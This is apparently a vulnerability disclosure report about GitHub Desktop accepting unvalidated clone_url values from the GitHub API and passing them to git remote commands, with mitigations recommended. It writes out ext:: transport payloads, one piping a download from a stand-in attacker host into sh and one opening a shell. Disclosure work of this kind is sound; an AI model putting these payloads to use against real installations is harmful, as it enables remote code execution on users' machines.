### Title
Unvalidated `clone_url` from GitHub API response is passed directly into `git remote add` / `git remote set-url`, allowing arbitrary command execution via Git transport helpers - (File: app/src/lib/stores/app-store.ts, app/src/lib/stores/updates/update-remote-url.ts, app/src/lib/git/remote.ts)

### Summary
When GitHub Desktop checks out a pull request from a fork, or refreshes a repository's association with GitHub, it takes the `clone_url` field straight out of a GitHub API response object and feeds it unmodified into `git remote add`/`git remote set-url`. There is no allow-list on the URL scheme before this value is used as a Git remote, so a malicious or compromised GitHub API endpoint (e.g. a rogue/compromised GitHub Enterprise Server, or a MITM'd non-TLS-pinned enterprise deployment) can return a `clone_url` using Git's `ext::`/local-helper transport syntax instead of a normal `https://`/`git@` URL, resulting in local command execution the next time Desktop fetches that remote.

### Finding Description
`_findPullRequestBranch` derives `headCloneUrl` from the pull request's `head.repo.clone_url` (an API-provided field) and, if no existing remote matches, calls `addRemote(repository, forkRemoteName, headCloneUrl)` with no validation of the URL's scheme: [1](#0-0) 

`addRemote` passes the URL through untouched to `git remote add`: [2](#0-1) 

Immediately afterward, Desktop performs `_fetchRemote` against the newly added remote: [3](#0-2) 

A second path exists in `updateRemoteUrl`, which automatically rewrites the repository's default remote to the `clone_url` returned by `api.fetchRepository`. Its checks only compare protocol *strings* for equality (`https:` == `https:`), not whether the protocol is a safe one such as `ext::`: [4](#0-3) 

This is invoked automatically whenever a repository is selected, via `repositoryWithRefreshedGitHubRepository`: [5](#0-4) 

Neither of these paths (nor the underlying `git()`/`envForRemoteOperation` helpers) sets `GIT_ALLOW_PROTOCOL` or otherwise restricts the transport scheme: [6](#0-5) 

Contrast this with `clone()`, which at least separates the URL from option parsing with `--` to avoid flag injection, but likewise performs no protocol allow-listing: [7](#0-6) 

Git natively supports the `ext::` remote helper, which executes an arbitrary shell command as the "transport" for a fetch/clone operation. If the value returned as `clone_url` is something like `ext::sh -c "curl http://attacker/x|sh"`, then `git remote add`/`git remote set-url` followed by `git fetch` (both of which Desktop performs automatically as part of "checkout PR from fork" or "refresh repository") will execute that command with the privileges of the Desktop process.

### Impact Explanation
Successful exploitation results in local code execution on the victim's machine, entirely from data returned by a GitHub API response object — squarely one of the accepted impact categories (attacker controls a GitHub API object → code execution). It does not require local/physical access, prior malware, or leaked credentials; it only requires the attacker to control (or MITM) the API responses the app trusts, which for GitHub Enterprise Server deployments or a compromised/malicious `.com`-like endpoint is realistic for the "GitHub API object" threat model.

### Likelihood Explanation
Likelihood is medium: it requires the victim to be pointed at (or MITM'd against) an API endpoint an attacker controls, and requires the `ext::`/local-helper transport to not be disabled (which is Git's default, unmodified behavior — Desktop nowhere sets `GIT_ALLOW_PROTOCOL` or `protocol.ext.allow=never`). The "checkout PR from fork" path is triggered by ordinary user action (checking out a PR) without any warning that the fork's clone URL is unvalidated.

### Recommendation
- Before calling `addRemote`/`setRemoteURL`/`git remote set-url` with any URL sourced from a GitHub API object (`clone_url`, `ssh_url`, PR `head.repo.clone_url`, etc.), validate that the scheme is one of the expected safe protocols (`https:`, `ssh:`, `git:`) and reject everything else (in particular `ext::`, `fd::`, `file://` unless explicitly required).
- Additionally, set `GIT_ALLOW_PROTOCOL` (or `protocol.ext.allow=never`, `protocol.file.allow=never` where not needed) in the environment used for all Git network operations (`envForRemoteOperation`) as defense in depth, regardless of app-level validation.

### Proof of Concept
1. Attacker stands up (or compromises) a GitHub Enterprise Server-like API endpoint that the victim's Desktop instance is configured to talk to, or otherwise causes the victim to receive a crafted GitHub API repository object (e.g. as `head.repo` of a pull request).
2. The crafted object's `clone_url` field is set to: `ext::sh -c "touch /tmp/pwned; sh -i <&2 >&2"` (or a Windows equivalent using `cmd.exe`).
3. Victim, viewing this PR in GitHub Desktop, clicks "Checkout" (drives `_checkoutPullRequest` → `_findPullRequestBranch`), or simply has that repository/account refreshed, triggering `repositoryWithRefreshedGitHubRepository`/`updateRemoteUrl`.
4. Desktop calls `addRemote`/`setRemoteURL` with the malicious `clone_url`, then performs a `git fetch` against it as part of the checkout/refresh flow.
5. Git's `ext::` helper executes the attacker's command with the privileges of the Desktop process, achieving code execution without further user interaction beyond the normal "checkout this PR" action.

```typescript
export async function updateRemoteUrl(
  gitStore: GitStore,
  gitHubRepository: GitHubRepository,
  apiRepo: IAPIRepository
): Promise<void> {
  // I'm not sure when these early exit conditions would be met. But when they are
  // we don't have enough information to continue so exit early!
  if (gitStore.defaultRemote === null) {
    return
  }

  const remoteUrl = gitStore.defaultRemote.url
  const updatedRemoteUrl = apiRepo.clone_url
  const urlsMatch = urlMatchesRemote(updatedRemoteUrl, gitStore.defaultRemote)

  // Verify that protocol hasn't changed. If it has we don't want
  // to alter the protocol in case they are relying on a specific one.
  // If protocol is null that implies the url is a ssh url
  // of the format git@github.com:octocat/Hello-World.git, which
  // can't be parsed by URL.parse. In this case we assume the user
  // manually configured their remote to use this format and we don't
  // want to change what they've done just to be safe
  const parsedRemoteUrl = URL.parse(remoteUrl)
  const parsedUpdatedRemoteUrl = URL.parse(updatedRemoteUrl)
  const protocolsMatch =
    parsedRemoteUrl.protocol !== null &&
    parsedUpdatedRemoteUrl.protocol !== null &&
    parsedRemoteUrl.protocol === parsedUpdatedRemoteUrl.protocol

  // Check if the default remote url has been manually changed from the
  // clone url retrieved from the GitHub API previously
  const remoteUrlUnchanged =
    gitStore.defaultRemote &&
    urlMatchesRemote(gitHubRepository.cloneURL, gitStore.defaultRemote)

  if (protocolsMatch && remoteUrlUnchanged && !urlsMatch) {
    await gitStore.setRemoteURL(gitStore.defaultRemote.name, updatedRemoteUrl)
  }
}
```
